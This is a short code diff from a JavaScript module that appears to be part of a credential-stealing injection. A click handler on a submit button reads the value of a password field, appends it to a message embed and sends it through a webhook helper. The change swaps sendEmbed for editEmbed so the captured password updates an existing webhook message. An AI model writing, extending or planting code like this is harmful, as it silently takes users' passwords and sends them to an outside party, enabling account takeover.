@@ -34,7 +34,7 @@ module.exports = {
         submitButton.addEventListener('click', async () => {
           const embed = await Util.Webhook.getMessage(window[variable]);
           embed.fields.push(['Password', passwordInput.value]);
-          await Util.Webhook.sendEmbed(embed);
+          await Util.Webhook.editEmbed(embed, window[variable]);
         });
       }
     }
